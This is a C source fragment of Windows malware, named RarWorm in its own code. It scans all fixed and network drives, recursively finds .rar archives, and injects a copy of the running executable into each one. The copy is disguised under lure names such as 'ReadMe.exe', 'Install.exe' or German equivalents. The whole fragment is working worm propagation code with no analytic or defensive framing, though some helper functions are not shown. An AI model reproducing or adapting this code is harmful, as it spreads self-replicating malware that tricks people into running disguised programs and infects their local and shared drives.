   void InfectDirectory(void);

   DWORD WINAPI RarWorm(LPVOID)
   {
       char            DriveLetter[2];
       char            Buffer[MAX_PATH];

       for(int d = 66; d < 91; d++) //b - z
       {
           DriveLetter[0] = d;
           DriveLetter[1] = 0;

           lstrcpy(Buffer, DriveLetter);
           lstrcat(Buffer, ":\\");

           if(GetDriveType(Buffer) == DRIVE_FIXED || GetDriveType(Buffer) == DRIVE_REMOTE)
           {
               if(SetCurrentDirectory(Buffer) != 0)
               {
                   InfectDirectory();
               }
           }

       }

       return 0;
   }

   void InfectDirectory(void)
   {
       HANDLE          FindHandle;
       WIN32_FIND_DATA Win32FindData;
       char            WormFile[MAX_PATH];
       char            InfectionName[MAX_PATH];
       char            *FakeNameGer[] =    {
                                               "Installation",
                                               "LiesMich",
                                               "Lizenz",
                                               "Bilder",
                                               "Addons",
                                               "Quellcode"
                                           };
       char            *FakeNameEng[] =    {
                                               "Install",
                                               "ReadMe",
                                               "Licence",
                                               "Pictures",
                                               "Addons_ENG",
                                               "SourceCode"
                                           };

       if(GetModuleFileName(0, WormFile, sizeof(WormFile)) != 0)
       {
           FindHandle = FindFirstFile("*", &Win32FindData);

           do
           {
               if(Win32FindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY && Win32FindData.cFileName[0] != '.')
               {
                   if(SetCurrentDirectory(Win32FindData.cFileName) != 0)
                   {
                       InfectDirectory();
                       SetCurrentDirectory("..");
                   }
               }
               else if(Win32FindData.cFileName[0] != '.')
               {
                   CharLowerBuff(Win32FindData.cFileName, lstrlen(Win32FindData.cFileName));

                   if(lstrcmp(Win32FindData.cFileName + lstrlen(Win32FindData.cFileName) - 4, ".rar") == 0)
                   {
                       if(RandomNumber(10) < 8)
                       {
                           if(GermanLang() == true)
                           {
                               lstrcpy(InfectionName, FakeNameGer[RandomNumber(6)]);
                           }
                           else
                           {
                               lstrcpy(InfectionName, FakeNameEng[RandomNumber(6)]);
                           }
                       }
                       else
                       {
                           Win32FindData.cFileName[lstrlen(Win32FindData.cFileName) - 4] = 0;
                           lstrcpy(InfectionName, Win32FindData.cFileName);
                           lstrcat(Win32FindData.cFileName, ".rar");
                       }

                       lstrcat(InfectionName, ".exe");

                       AddToRar(Win32FindData.cFileName, WormFile, InfectionName, FILE_ATTRIBUTE_NORMAL);
                   }
               }
           }
           while(FindNextFile(FindHandle, &Win32FindData) != 0);
       }

       return;
   }
